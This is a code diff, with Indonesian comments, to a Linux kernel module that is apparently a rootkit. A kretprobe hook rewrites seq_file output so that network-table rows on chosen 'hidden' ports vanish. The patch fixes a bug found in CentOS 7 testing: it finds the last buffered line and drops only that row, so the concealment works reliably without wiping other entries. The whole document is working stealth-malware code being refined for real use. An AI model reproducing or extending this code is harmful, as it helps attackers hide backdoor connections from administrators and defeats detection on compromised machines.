@@ -74,32 +74,50 @@ static int seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct seq_save *s = (struct seq_save *)ri->data;
-	const char *buf, *end, *c1, *c2, *c3;
+	char *buf, *row, *end;
+	const char *c1, *c2, *c3;
 	unsigned int port;
 
 	(void)regs;
 	if (!s->m || !s->m->buf || !s->m->count || !rk_any_ports())
 		return 0;
-
 	buf = s->m->buf;
 	end = buf + s->m->count;
 
+	/*
+	 * PERBAIKAN BUG LAPANGAN (bug identik terbukti di backend legacy
+	 * saat uji CentOS7): seq_read MENUMPUK banyak baris dalam satu
+	 * buffer — loop "Fill" memanggil show() berulang dan tiap baris
+	 * MENAMBAH di akhir buffer. Karena itu:
+	 *   - yang baru selesai ditulis = baris TERAKHIR (bukan buf[0]!)
+	 *     -> proses HANYA baris itu (dari '\n' sebelumnya)
+	 *   - kalau cocok, buang HANYA baris itu (count -= panjang) —
+	 *     jangan count=0 (lama: port dibaca dari baris PERTAMA buffer
+	 *     -> baris ke-N tak pernah cocok; count=0 juga ikut
+	 *     menghapus semua baris lain).
+	 */
+	if (end[-1] != '\n')
+		return 0;          /* baris belum utuh (overflow) — biarkan kernel */
+	row = end - 1;            /* titik '\n' penutup baris terakhir */
+	while (row > buf && row[-1] != '\n')
+		row--;               /* mundur ke awal baris terakhir */
+
 	/* lewati kolon pertama (field "sl"), ambil port lokal */
-	c1 = next_colon(buf, end);
+	c1 = next_colon(row, end);
 	if (!c1)
 		return 0;
 	c2 = next_colon(c1 + 1, end);
 	if (!c2 || !hex4(c2 + 1, end, &port))
 		return 0;
 	if (port <= 0xffff && rk_is_hidden_port((u16)port)) {
-		s->m->count = 0;              /* buang baris */
+		s->m->count = row - buf;   /* buang hanya baris ini */
 		return 0;
 	}
 	/* port remote = kolon ketiga */
 	c3 = next_colon(c2 + 1, end);
 	if (c3 && hex4(c3 + 1, end, &port) &&
 	    port <= 0xffff && rk_is_hidden_port((u16)port))
-		s->m->count = 0;
+		s->m->count = row - buf;
 	return 0;
 }
 
